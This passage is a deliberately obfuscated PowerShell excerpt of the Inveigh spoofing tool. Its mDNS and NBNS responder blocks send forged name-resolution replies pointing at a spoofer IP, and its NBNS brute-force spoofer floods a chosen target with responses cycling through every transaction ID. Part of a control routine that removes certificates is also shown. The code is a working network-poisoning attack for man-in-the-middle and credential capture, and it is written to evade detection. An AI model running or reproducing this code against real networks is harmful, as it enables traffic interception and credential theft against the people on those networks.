            ${SOUR`CE_`iP} = ${mDN`S_lISt`EN`E`R`_EnDpO`iNt}."aDD`ReSS"."ip`Ad`D`Re`SSTOSTrIng"
                
            if(!${In`SpeCT} -and (${m`dn`s_RE`quEsT_`datA} -and ${MD`N`S_ListENEr_enDpo`i`Nt}."a`ddRE`Ss"."IP`Ad`dr`es`StoSt`RING" -ne ("{1}{0}" -f'0','0.0.0.')) -and (!${Sp`OoF`ER`HO`ST`SrepLY} -or ${s`poOFERHO`Stsr`ePly} -contains ${mdNs_quER`Y_s`TR`iNG}) -and (
            !${s`P`oofeRHOSTSIgno`RE} -or ${sP`O`OFErhOSTS`iGN`o`Re} -notcontains ${MDns_QUE`RY`_s`T`RI`NG}) -and (!${S`P`ooF`eRIpS`REPLy} -or ${s`poO`Fe`RIP`SRePlY} -contains ${sO`URC`E_iP}) -and (!${SpOoF`e`R`IpSi`gnoRE} -or ${sPOO`FERIP`S`iGnoRE} -notcontains ${sou`R`CE_`ip}) -and (
            ${m`DNSTy`PEs} -contains 'QM') -and (${i`Nvei`gh}."Spoo`Fe`R_REpe`At" -or ${INvE`i`GH}."iP_`cAp`TURe_`lI`St" -notcontains ${soUrC`e_`ip}))
            {
                ${md`Ns_dEs`TIN`ATIO`N_EndpOiNT} = &("{2}{0}{1}{3}"-f 'ew','-Obj','N','ect') ("{2}{0}{1}"-f 'Endpoin','t','Net.IP')([IPAddress]("{1}{2}{0}" -f'1','22','4.0.0.25'),5353)
                ${mdNs_UDp`_`clI`ENT}.("{1}{0}{2}"-f'ec','Conn','t').Invoke(${mDns_d`E`St`iNation`_EN`d`pO`iNt})
                ${M`dnS`_u`dP_CLIENT}.("{1}{0}" -f 'd','Sen').Invoke(${M`D`Ns_respo`NsE_Pa`c`kET},${md`NS_REspOnSe_p`A`cket}."Le`N`gTh")
                ${Md`Ns_U`DP`_cLiE`NT}.("{1}{0}"-f'ose','Cl').Invoke()
                ${MDNs_Ud`P_C`Li`e`Nt} = &("{2}{0}{1}" -f 'w-','Object','ne') ("{4}{3}{1}{2}{0}{5}" -f 't.Socket','ste','m.Ne','y','S','s.UdpClient') 5353
                ${mDN`s_Mu`lT`IC`Ast_GRo`UP} = [IPAddress]("{0}{3}{1}{2}" -f '2','0.0.','251','24.')
                ${mDN`s_`Udp`_ClIEnT}.("{3}{4}{0}{2}{1}"-f'inM','p','ulticastGrou','J','o').Invoke(${MDNS_MUltI`C`A`s`T_gROup})
                ${M`d`N`S_`Udp_cLieNt}."Cl`Ie`Nt"."RE`CE`ivet`ImE`oUt" = 5000
                ${MDN`S_`R`eSpons`E_M`eSSA`gE} = ("{3}{2}{4}{1}{0}" -f'ent','s','spon','- re','se ')
            }
            else
            {

                if(${I`NSpect})
                {
                    ${MDNS_REs`pONSe_Mes`S`A`ge} = ("{2}{1}{0}"-f 't only','c','- inspe')
                }
                elseif(${m`Dn`St`YpEs} -notcontains 'QM')
                {
                    ${mDn`S_RespO`NsE_m`essa`gE} = ("{2}{3}{0}{1}"-f'S ty','pe','- disabled m','DN')
                }
                elseif(${SpoOFErH`ostS`Rep`ly} -and ${SpOO`FErHO`S`Ts`RepLY} -notcontains ${m`Dns_Qu`eR`Y_StrING})
                {
                    ${md`NS_`ReS`P`oNsE_Me`ssA`Ge} = ('- '+"$mDNS_query_string "+'is'+' '+'no'+'t '+'on'+' '+'r'+'eply '+'l'+'ist')
                }
                elseif(${SpoOFe`Rh`O`s`TsIg`NoRe} -and ${SpOo`F`ERH`O`StsIgnORe} -contains ${Md`N`S_QUE`RY_STri`Ng})
                {
                    ${MD`Ns_Re`spONS`E`_mesSA`gE} = ('- '+"$mDNS_query_string "+'is'+' '+'o'+'n '+'ig'+'nore '+'l'+'ist')
                }
                elseif(${spOo`FeRips`RE`PLY} -and ${sP`oOFEri`pSre`pLy} -notcontains ${Sou`R`ce_ip})
                {
                    ${MdN`s`_ResponSe_m`Es`Sage} = ('- '+"$source_IP "+'i'+'s '+'not'+' '+'o'+'n '+'re'+'ply'+' '+'lis'+'t')
                }
                elseif(${s`pOOfE`RIp`sIG`No`Re} -and ${SpoofERIPSi`g`N`Ore} -contains ${SO`UR`Ce_ip})
                {
                    ${MD`Ns_RespO`Nse_m`eSs`AGe} = ('- '+"$source_IP "+'i'+'s '+'o'+'n '+'ign'+'ore '+'li'+'st')
                }
                elseif(${I`NVEI`gH}."i`P`_CaPtur`E_`lISt" -contains ${sOu`R`ce_`Ip})
                {
                    ${MdnS_`R`eSpon`se`_me`sSagE} = ('- '+'pr'+'eviou'+'s '+'c'+'apture'+' '+'fr'+'om '+"$source_IP")
                }
                else
                {
                    ${mDn`S_`R`esPONS`e`_mEss`AGe} = ("{4}{1}{2}{3}{0}" -f'rong','some','thing went ','w','- ')
                }

            }

            if(${md`N`s`_reQue`St_D`Ata})                   
            {
                ${iN`V`eigH}."c`O`NS`oLe_QuEuE".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))

                if(${invE`igh}."FIL`e`_ou`TPUt")
                {
                    ${iNV`eiGh}."L`Og_FIle_`Q`U`eUe".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                }

                if(${I`NV`EigH}."LO`g_O`UtPUT")
                {
                    ${Inv`E`IgH}."l`oG".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - mDNS(QM) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                }

            }

            ${MD`NS_rEQuE`S`T_`d`Ata} = ""
        }

    }

    ${mdN`s`_uDP`_ClIeNT}.("{1}{0}"-f'se','Clo').Invoke()
 }


${n`BN`s_SpoOFEr`_scRiP`TBLoCk} = 
{
    param (${INS`peCT},${NbNs_RE`SPON`Se_MES`sagE},${s`POO`FeRip},${NB`NStyp`es},${SpOO`FEr`hO`s`TSR`ePlY},${S`pO`of`erhOstSIGNo`Re},${s`Poof`erIPSrE`pLy},${spoofer`iPSi`GN`OrE},${n`BNsTTL})

    ${nBnS_runn`I`Ng} = ${TR`UE}
    ${NbnS`_LIsTe`N`e`R_eNdpo`INt} = &("{1}{0}{2}"-f 'Obj','New-','ect') ("{4}{2}{1}{0}{3}" -f 'oin','P','ystem.Net.IPEnd','t','S') (  ${w`x9l}::"BR`oaDCa`ST",137)

    try
    {
        ${N`B`N`S_uDp_c`lie`Nt} = &("{1}{0}{3}{2}" -f'ew','N','bject','-O') ("{8}{0}{3}{4}{7}{5}{2}{1}{6}" -f 'ys','s','cket','tem.','Ne','.So','.UdpClient','t','S') 137
    }
    catch
    {
        ${in`VE`Igh}."COnSo`LE_`qU`e`UE".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - Error starting NBNS spoofer "))
        ${n`B`NS`_r`UNnIng} = ${fal`SE}

        if(${iNV`EI`gh}."fiLE_`OU`T`puT")
        {
            ${InVe`IgH}."lO`G_fILe`_q`U`EuE".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - Error starting NBNS spoofer "))
        }

        if(${iNv`Ei`gh}."L`OG_OUT`PUt")
        {
            ${IN`V`eiGh}."L`oG".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - Error starting NBNS spoofer "))
        }

    }

    ${N`BnS`_UDp_cLi`enT}."cLiE`Nt"."rECeiveTI`MeO`Ut" = 5000
    ${NbNs_`TTl_B`y`TEs} =  (LS ('vaRiab'+'Le'+':5e9'+'A') )."VAl`Ue"::("{0}{1}"-f'GetB','ytes').Invoke(${N`BNS`Ttl})
      ${yGa`T`1E}::("{0}{2}{1}"-f 'Re','e','vers').Invoke(${N`B`N`s_`TTL_Bytes})

    while(${I`N`VEIgh}."rU`N`NiNg" -and ${nB`Ns_ruNn`I`NG})
    {
        
        try
        {
            ${Nbns_`REQU`ES`T`_d`ATA} = ${NbN`S_uDp_Cl`ienT}."r`eC`eiVe"([Ref]${N`BnS_Lis`T`en`eR_en`dpO`Int})
        }
        catch
        {
            ${nbnS_Ud`p_`c`LiE`NT}.("{0}{1}"-f 'Clos','e').Invoke()
            ${Nbns_`UD`P_CLiE`NT} = &("{2}{0}{1}" -f 'je','ct','New-Ob') ("{0}{5}{7}{2}{6}{1}{4}{3}"-f'System.','ie','s.','t','n','Net.','UdpCl','Socket') 137
            ${Nb`N`S_`Ud`P_C`LIenT}."cliE`Nt"."Re`cEiv`e`TimEout" = 5000
        }

        ${IP} = (&("{1}{0}{2}"-f'Conne','Test-','ction') ("{3}{2}{1}{0}"-f '0.1','.','0','127.') -count 1 | &("{0}{1}{2}" -f 'Selec','t-Ob','ject') -ExpandProperty ("{1}{2}{0}"-f's','Ip','v4Addres'))

        if(${nB`NS_`REqueSt_D`ATa} -and   ${5E`9A}::"T`osTr`InG"(${nbN`S_`ReQ`UeSt`_dAtA}[10..11]) -ne ("{0}{1}"-f '00','-01'))
        {
            ${NbnS_`Tt`l_BY`TeS} =   (gET-vArIaBLE 5E9A -vAl )::("{2}{0}{1}"-f 'Byte','s','Get').Invoke(${nBnS`T`TL})
             (  VaRIAble ('yG'+'a'+'T1e') -VaLUeo)::("{1}{0}" -f 'everse','R').Invoke(${n`BNS_TTl`_`BY`TeS})

            ${n`BNs`_r`eS`PonSE_pa`CkEt} = ${NBN`S`_ReQuest_`da`TA}[0,1] +
                                    0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                    ${NbNS_r`EQues`T_D`AtA}[13..${NB`NS`_`REQUEst`_Data}."le`N`GTh"] +
                                    ${n`Bn`S_t`Tl_bYTes} +
                                    0x00,0x06,0x00,0x00 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]${sp`oo`FE`RiP})).("{1}{0}{2}{3}" -f 'etAddres','G','s','Bytes').Invoke() +
                                    0x00,0x00,0x00,0x00

            ${soUrCE`_`IP} = ${n`B`N`s_`LIS`TenEr_En`D`point}."ad`DrEsS"."iPAdD`REsSTostr`i`NG"
            ${Nbns`_q`U`eRY_TyPe} =   (vArIablE 5e9A)."vA`LUe"::"t`o`STrInG"(${N`Bns_`RE`qUeS`T_DA`TA}[43..44])
                    
            switch (${nb`N`S`_quER`y_`TYPE})
            {

                ("{1}{0}" -f '-41','41')
                {
                    ${Nbns`_qu`ErY_`Ty`PE} = "00"
                }

                ("{0}{1}"-f'41-4','4')
                {
                    ${NB`N`s`_`Query_TypE} = "03"
                }

                ("{1}{0}"-f'-41','43')
                {
                    ${nBNS`_`qUeRY_t`ypE} = "20"
                }

                ("{1}{0}" -f '-4C','42')
                {
                    ${nbN`s`_`QueR`y_tYPe} = "1B"
                }

                ("{1}{0}" -f '2-4D','4')
                {
                    ${n`Bn`s_`QUE`Ry_Type} = "1C"
                }

                ("{1}{0}" -f'4E','42-')
                {
                    ${N`Bn`s_`qUErY`_t`YPe} = "1D"
                }

                ("{0}{1}" -f '42-','4F')
                {
                    ${NbNS_q`UerY_`T`Ype} = "1E"
                }

            }

            ${Nb`N`S_`quERy} =  (  gCi vAriablE:5E9A )."Val`Ue"::"TO`S`TRing"(${nBNs_rEquE`st`_`daTA}[13..(${NBN`S_rEQ`U`EsT_`da`TA}."L`eng`TH" - 4)])
            ${nBNs_`Q`UeRy} = ${NbNS_`QUe`Ry} -replace "-00",""
            ${nBNS_`QUE`Ry} = ${n`BnS_q`UeRY}.("{1}{0}" -f 'lit','Sp').Invoke("-") | &("{4}{1}{2}{3}{0}"-f 'ct','ch-','Ob','je','ForEa'){[Char] ${v`wE}::("{1}{0}{2}"-f 'I','To','nt16').Invoke(${_},16)}
            ${nB`NS_QuerY_st`Rin`G_`enCOdEd} = &("{2}{1}{0}" -f'ect','bj','New-O') ("{3}{2}{0}{1}" -f'i','ng','em.Str','Syst') (${nb`NS_q`UErY},0,${nBnS`_`Q`UErY}."LeNG`TH")
            ${nbNS_QUE`RY`_`S`TRI`NG`_Enc`odEd} = ${nBnS_`QuE`Ry`_S`TRINg_EN`c`OdEd}.("{0}{2}{1}"-f'Substr','ng','i').Invoke(0,${nbNs_Qu`erY_STR`In`G_enc`od`ED}.("{2}{0}{1}"-f 'nde','xOf','I').Invoke("CA"))
            ${NBn`S_QU`erY`_S`TR`ing_suBTra`cTEd} = ""
            ${nBns_quERY`_stR`i`NG} = ""
            ${N} = 0
                            
            do
            {
                ${NBNs_`qUeRY`_StRI`NG`_`S`Ub} = (([Byte][Char](${NBNS_Qu`ERy_`stri`NG`_`eNCoDED}.("{0}{2}{1}"-f'Subst','g','rin').Invoke(${n},1))) - 65)
                ${NbNS_q`Ue`R`Y_StRiNg_Su`BT`Ra`cTED} += ( (GEt-CHilDiteM ('vaRiAbL'+'E'+':'+'Vwe')  )."Val`UE"::("{2}{1}{0}" -f 'ing','r','ToSt').Invoke(${Nbns`_QuErY`_sTRi`N`g_sUB},16))
                ${n} += 1
            }
            until(${n} -gt (${Nb`Ns_qu`ER`Y_STRIng_`eNcODeD}."LEN`Gth" - 1))
                    
            ${n} = 0
                    
            do
            {
                ${nBNS_qU`e`RY`_sTrING} += ([Char]( ${V`we}::("{0}{1}"-f 'ToInt','16').Invoke(${NBn`s_q`U`ERy`_`st`R`ING_subtra`cTed}.("{0}{2}{3}{1}" -f'Su','g','bstri','n').Invoke(${N},2),16)))
                ${n} += 2
            }
            until(${n} -gt (${NbNs_q`Ue`Ry`_stri`NG_`sUBtR`A`C`TeD}."lE`Ng`TH" - 1) -or ${NB`N`S_quer`Y_STr`i`NG}."LEN`g`Th" -eq 15)
                                 
            if(!${iNsp`E`ct} -and (${nbNs_r`equ`est_Da`Ta} -and ${nbns_L`I`stenEr_`ENDP`o`iNt}."aD`Dre`sS"."iPa`ddr`esstO`s`TRi`NG" -ne ("{1}{0}{3}{2}" -f'2','255.','255.255','55.')) -and (!${S`P`o`OFErHosTSr`EPlY} -or ${S`pOo`FeRHOSTS`Reply} -contains ${NBnS_`qUE`Ry_sT`RINg}) -and (
            !${S`POOfeRHOs`TS`Ign`O`RE} -or ${SpoOF`eRhOSts`i`Gn`ORe} -notcontains ${n`Bns_quER`y_S`T`R`ing}) -and (!${S`pOOfE`RI`p`srEplY} -or ${spoO`FE`RiPsre`Ply} -contains ${SOurC`e_`Ip}) -and (!${S`P`OOF`ErI`PsIg`Nore} -or ${SpoOf`eRIp`si`GNo`Re} -notcontains ${sOUr`ce_`iP}) -and (
            ${IN`V`eIGh}."sPO`OFeR`_`REpe`AT" -or ${I`Nv`EIgh}."I`P_`capT`Ure_LI`st" -notcontains ${SOU`R`CE_Ip}) -and (${n`BNSTYP`Es} -contains ${n`BnS_`QU`ErY`_tYPe}) -and (${S`OurcE_`Ip} -ne ${i`P}))
            {
                ${nbNS_d`eStINA`TiO`N_`eN`DP`oint} = &("{2}{0}{1}"-f'w-Ob','ject','Ne') ("{4}{0}{3}{1}{2}" -f 'tem.Ne','Endp','oint','t.IP','Sys')(${nbns_Lis`TEn`Er_`en`D`PO`InT}."ADD`ResS",137)
                ${NBnS_uDp`_cL`Ie`Nt}.("{0}{1}{2}"-f 'Co','nne','ct').Invoke(${nbn`S_DeS`T`i`NaTI`On_enDP`oInT})
                ${NBn`S`_uDp_CLI`enT}.("{0}{1}"-f'S','end').Invoke(${n`BnS_rEsP`oN`SE`_p`A`ckEt},${NBNS`_`REs`p`onsE`_paC`KET}."LeN`gTH")
                ${NBn`S_uDp_c`lIE`NT}.("{0}{1}"-f 'Cl','ose').Invoke()
                ${nbN`S_u`dp`_cLi`EnT} = &("{2}{1}{0}"-f 't','-Objec','New') ("{7}{1}{2}{3}{5}{0}{4}{6}"-f'ts.U','stem.Net.','So','c','dpC','ke','lient','Sy') 137
                ${nBNS`_uDp`_ClI`e`Nt}."Cl`IeNt"."reCEiVETI`Me`oUT" = 5000
                ${nbn`S_`Re`s`pONSE_m`esSa`GE} = ("{3}{1}{2}{0}"-f 'ent','o','nse s','- resp')
            }
            else
            {

                if(${INs`peCT})
                {
                    ${nbNs`_REsP`On`S`e`_MESs`AgE} = ("{2}{0}{1}" -f ' ins','pect only','-')
                }
                elseif(${nB`N`StyP`es} -notcontains ${NBns`_Q`U`ErY_T`Ype})
                {
                    ${nb`Ns_r`es`Po`N`SE_`mESsAGe} = ("{4}{0}{3}{2}{1}" -f 'ed N','e','S typ','BN','- disabl')
                }
                elseif(${spO`o`FeR`HostS`Rep`Ly} -and ${SP`oO`FE`RHOs`Tsrep`lY} -notcontains ${N`BNS_qUE`RY_S`T`RI`Ng})
                {
                    ${nb`NS`_RE`S`POnse_`Me`sSAgE} = ('- '+"$NBNS_query_string "+'is'+' '+'not'+' '+'on'+' '+'r'+'ep'+'ly '+'l'+'ist')
                }
                elseif(${SpOO`Fer`h`oS`Ts`I`GNoRE} -and ${SPoo`FErHoStsI`GN`OrE} -contains ${n`Bns`_q`Ue`Ry`_stRinG})
                {
                    ${Nbns_Re`s`P`onsE`_`meS`sagE} = ('- '+"$NBNS_query_string "+'i'+'s '+'o'+'n '+'i'+'gnore'+' '+'lis'+'t')
                }
                elseif(${sp`OOfEriPs`Rep`LY} -and ${s`poofE`RIP`SrEpLy} -notcontains ${sO`U`RCe_IP})
                {
                    ${nb`Ns_R`eS`PoNs`E_mE`sSAge} = ('- '+"$source_IP "+'i'+'s '+'n'+'ot '+'on'+' '+'re'+'ply '+'l'+'ist')
                }
                elseif(${spOO`FeRi`ps`IGNORE} -and ${SpO`O`F`ERiP`SiG`Nore} -contains ${So`U`RcE_iP})
                {
                    ${nbn`S_`Re`SPo`NSE`_mESs`Age} = ('- '+"$source_IP "+'i'+'s '+'o'+'n '+'igno'+'re'+' '+'li'+'st')
                }
                elseif(${I`N`VeIGH}."IP_c`AP`Tu`R`E_lisT" -contains ${soU`Rce`_IP})
                {
                    ${n`B`Ns`_respoNSe_MEsS`A`Ge} = ('- '+'pr'+'e'+'vious '+'capt'+'u'+'re '+'f'+'rom '+"$source_IP")
                }
                elseif(${sOur`C`e_Ip} -eq ${iP})
                {
                    ${NB`Ns`_`Re`sPONSE_me`ss`Age} = ("{2}{3}{0}{1}" -f 'cal req','uest','- ','lo')
                }
                else
                {
                    ${N`BNS_reS`PoNsE_`Mess`Age} = ("{4}{3}{2}{0}{1}" -f ' w','rong','nt','thing we','- some')
                }
                                    
            }

            if(${Nbns_`ReQU`E`S`T_datA})                   
            {
                 ${i`NvE`igh}."coNS`O`le_`QUeuE".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message "))

                if(${I`Nv`EIGh}."f`ILE`_Ou`TPut")
                {
                    ${inV`EI`gh}."Lo`g_fi`Le_qu`eue".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message "))
                }

                if(${i`N`VEigH}."LO`G_`OUtpUt")
                {
                    ${i`NveiGH}."l`og".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message "))
                }

            }

            ${NbNS_R`EQUe`sT_D`Ata} = ""
        }

    }

    ${nbN`S_UdP_cl`i`eNt}.("{0}{1}"-f 'Cl','ose').Invoke()
 }


${N`Bns`_brUt`EfoRCE_s`poOFER_SCrip`TBLoCk} = 
{
    param (${Sp`O`OFerIP},${n`BN`SBR`UTefor`cehOSt},${n`BNs`Brut`efO`RCe`TArGET},${nbNSBR`UT`E`FoRcePAU`SE},${N`BNS`TTL})
   
    ${NBNS`BrUtE`F`ORC`ehO`sT} = ${NbNsBRute`FOr`C`ehOST}.("{2}{1}{0}" -f'r','ppe','ToU').Invoke()

    ${H`o`s`TNA`ME_bytes} = 0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,
                        0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00

    ${HOS`TnaMe_`En`C`ODEd} =   (  VARIaBLE  ("lN5"+"h")  )."VA`Lue"::"u`TF8".("{1}{0}{2}" -f'y','GetB','tes').Invoke(${NbNsbRUTeF`orCe`HO`ST})
    ${hoS`T`NAmE`_e`N`cOdEd} =   ( Gci VARiaBLe:5e9A)."V`Alue"::("{1}{0}" -f 'ring','ToSt').Invoke(${Hos`T`NA`Me_e`NCoDeD})
    ${h`O`stn`AMe_`encoD`eD} = ${hOsT`NaME_`EnC`O`dED}.("{1}{0}" -f 'eplace','R').Invoke("-","")
    ${HO`stn`AME_e`NCod`ed} =   ( gCi  vaRiabLe:Ln5h  )."VA`lue"::"Ut`F8".("{1}{0}{2}"-f 'tByte','Ge','s').Invoke(${ho`StN`AM`E_ENcoDED})
    ${nb`N`S`_ttL_bY`TEs} =  (VaRiABle  5E9a )."vA`LUe"::("{2}{1}{0}"-f'tes','y','GetB').Invoke(${N`BN`STTl})
     (gEt-vArIAble  ygAt1e )."v`ALuE"::("{0}{1}" -f 'Re','verse').Invoke(${NBnS_`TTL`_BYt`eS})

    for(${I}=0; ${i} -lt ${hoS`TNAmE_`E`N`cO`DeD}."C`OunT"; ${I}++)
    {

        if(${H`OStnAMe`_`enCod`ED}[${I}] -gt 64)
        {
            ${HO`sTNAm`E_By`TeS}[${i}] = ${hOSTnAmE_`eNco`D`eD}[${i}] + 10
        }
        else
        {
            ${hOs`T`NAme`_`BYTeS}[${i}] = ${Host`NaMe_E`N`C`oDeD}[${I}] + 17
        }
    
    }

    ${Nbns_`Respons`E`_pAck`ET} = 0x00,0x00,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                            ${hO`STn`AmE`_BYtes} +
                            0x00,0x20,0x00,0x01 +
                            ${nbNs_`Ttl_`BYTes} +
                            0x00,0x06,0x00,0x00 +
                            ([System.Net.IPAddress][String]([System.Net.IPAddress]${S`PooF`er`IP})).("{2}{1}{0}{4}{3}"-f 're','d','GetAd','es','ssByt').Invoke() +
                            0x00,0x00,0x00,0x00

    ${I`Nv`EIGh}."C`o`NsOl`E_QUeUE".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget "))
    ${NBnS_`pA`USeD} = ${F`AlsE}          
    ${Nb`N`s`_BRutEForCe`_uDP`_CLiEnt} = &("{1}{0}{2}"-f 'ew-','N','Object') ("{8}{6}{0}{5}{3}{1}{4}{7}{2}" -f'm','Socket','lient','.','s.U','.Net','ste','dpC','Sy')(137)
    ${De`Stinat`iON`_ip} =   ${1`70N}::("{1}{0}" -f 'se','Par').Invoke(${nbNs`BR`U`Te`FOR`cEtarg`et})
    ${dEstiN`ATI`o`N_`poiNT} = &("{1}{0}{2}{3}" -f'w-O','Ne','bj','ect') ("{4}{2}{3}{1}{0}"-f'nt','ndpoi','t.IP','E','Ne')(${DesTI`NaT`ioN`_ip},137)
    ${NBNS`_bRuTe`F`oRCe_U`d`P_clIENT}.("{1}{0}{2}" -f'onnec','C','t').Invoke(${d`EST`i`NAT`Ion_pOint})

    if(${iN`Vei`gH}."F`il`E_OUTp`UT")
    {
        ${I`NV`eiGh}."lOg`_f`ile_qU`eue".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget "))
    }

    if(${i`N`VeIgh}."Lo`g_OUTP`Ut")
    {
        ${i`NvEi`Gh}."L`og".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve $NBNSBruteForceHost on $NBNSBruteForceTarget "))
    }
       
    while(${I`NVe`IGH}."r`UnnInG")
    {

        :NBNS_spoofer_loop while (!${i`N`VEigH}."H`o`St`NamE_SPo`Of" -and ${I`NVE`iGh}."run`NI`NG")
        {

            if(${n`Bns_`paU`Sed})
            {
                ${IN`V`eIgH}."CO`N`SOLE_Q`U`EUE".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - Resuming NBNS brute force spoofer "))
                ${Nb`NS_p`AUs`Ed} = ${Fa`LSe}

                if(${I`Nvei`gh}."FIle_`OUtP`UT")
                {
                    ${In`Veigh}."L`OG_F`ile_`queuE".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - Resuming NBNS brute force spoofer "))
                }

                if(${I`NveiGH}."Lo`G_out`PUT")
                {
                    ${In`V`EiGH}."l`og".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - Resuming NBNS brute force spoofer "))
                }

            }

            for (${I} = 0; ${I} -lt 255; ${I}++)
            {

                for (${J} = 0; ${J} -lt 255; ${J}++)
                {
                    ${N`Bns_RESP`ON`S`E_`pAckET}[0] = ${i}
                    ${nBnS_rE`SPOnSE_p`Ac`K`Et}[1] = ${J}                 
                    ${n`B`NS_br`UTefOr`cE_Ud`p_cL`I`Ent}.("{1}{0}"-f'nd','se').Invoke(${NbNS_reS`P`oNSe`_PACk`et},${nB`N`S_rESPONSe_`P`ACkET}."L`En`GtH")

                    if(${I`NvEIgh}."hO`STna`M`e_Sp`oOF" -and ${NB`N`SBrUTe`FO`Rc`epAUse})
                    {
                        ${i`NVe`iGH}."cO`Ns`OLE_qUEUe".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - Pausing NBNS brute force spoofer "))
                        ${nBNs`_Pau`s`Ed} = ${TR`UE}
                        break ("{4}{1}{5}{3}{2}{0}" -f 'p','_','loo','fer_','NBNS','spoo')

                        if(${i`NVE`IGh}."F`ILE`_`OuTpuT")
                        {
                            ${IN`Vei`Gh}."loG_fi`Le_Qu`E`Ue".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - Pausing NBNS brute force spoofer "))
                        }

                        if(${iN`VEi`GH}."l`oG_`oUtpUT")
                        {
                            ${InVEi`GH}."L`oG".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - Pausing NBNS brute force spoofer "))
                        }

                    }
                
                }
            
            }
        
        }

        &("{1}{2}{0}"-f'ep','Start-','Sle') -m 5
    }

    ${nBn`S_B`RUT`EfOrce_uDP_`CLIeNt}.("{0}{1}"-f 'Clo','se').Invoke()
}


${C`OnTr`ol_scR`I`PtBlo`CK} = 
{
    param (${CONsOLeqU`E`UE`liMIT},${N`BN`sBRuT`EforcEpAuSe},${Run`coUnt},${RuN`T`ime})

    ${INVEi`gH}."C`ONt`ROL" = ${T`RUE}

    function s`TOpinve`iGH
    {
        param ([String]${eXI`T_m`esSaGe})

        if(${i`NVE`iGH}."hT`TpS" -and !${i`Nv`EIGh}."Htt`P`S_E`Xi`stiNG_ceR`T`If`Ica`TE" -or (${i`N`VEigh}."HT`TPS_e`Xi`sti`NG_cEr`TIFICA`Te" -and ${i`NVei`gH}."hTTpS_fO`Rce_c`ERTI`FIC`A`Te_DelE`Te"))
        {

            try
            {
                ${CERT`iFIca`TE_St`o`Re} = &("{1}{0}{2}" -f '-','New','Object') ("{5}{8}{3}{4}{15}{11}{10}{13}{2}{7}{9}{6}{0}{1}{14}{12}" -f'a','te','r','ecu','rity.','System.','c','tif','S','i','phy.X5','togra','e','09Ce','s.X509Stor','Cryp')("My",("{0}{1}{2}" -f 'Loc','alMach','ine'))
                ${c`ertiF`Ic`A`Te_St`ore}.("{0}{1}"-f 'O','pen').Invoke(("{0}{1}{2}"-f 'R','eadW','rite'))
                ${CERTIFIc`A`T`eS} = (&("{2}{1}{0}" -f 'em','t-ChildIt','Ge') ((("{4}{1}{0}{2}{5}{3}"-f 'lM','rt:LeGLoca','ac','neLeGMy','Ce','hi'))  -CReplACe ([cHaR]76+[cHaR]101+[cHaR]71),[cHaR]92) | &("{0}{1}{2}{3}" -f'Whe','re','-','Object') {${_}."iS`s`Uer" -Like "CN=" + ${i`N`VEiGh}."C`ErTifiCaT`e_I`SSUER"})

                ForEach(${Cer`TiF`iCATE} in ${CeRT`iF`I`caTES})
                {
                    ${cER`TI`FicaT`e`_sTOrE}.("{1}{0}"-f'move','Re').Invoke(${C`ertIFiCA`Te})
                }

                ${C`ert`ifi`CAT`e_store}.("{0}{1}" -f'C','lose').Invoke()
            }
            catch
            {
                ${I`Nve`igh}."Co`N`S`oLE_QUeue".("{1}{0}"-f 'd','Ad').Invoke(("{10}{9}{0}{3}{5}{8}{1}{2}{6}{7}{4}"-f 'ica','Error - ','R','te','nually',' Dele','e','move Ma','tion ','SL Certif','S'))

                if(${I`N`VeiGh}."f`IL`e_OUtput")
                {
                    ${INvEI`GH}."LOg_`F`Ile_`quEUe".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually "))
                }

                if(${i`NVEI`GH}."loG_`oUtp`Ut")
                {
                    ${IN`VEi`gH}."L`og".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually "))
                }

            }

        }
        
        if(${I`NV`EIgh}."r`U`NnIng")
        {
            &("{0}{2}{3}{1}"-f'S','-Sleep','ta','rt') -S 1
            ${in`VEIGh}."C`oN`sOLE_`qu`euE".("{1}{0}"-f'd','Ad').Invoke(("Inveigh exited due to $exit_message at $(Get-Date -format 's') "))

            if(${iN`Ve`Igh}."fILe_`OUtP`Ut")
            {
                ${INve`igH}."log_FI`Le_Q`U`Eue".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - Inveigh exited due to $exit_message "))
            }

            if(${INVe`iGh}."LOg_`OU`TPuT")
            {
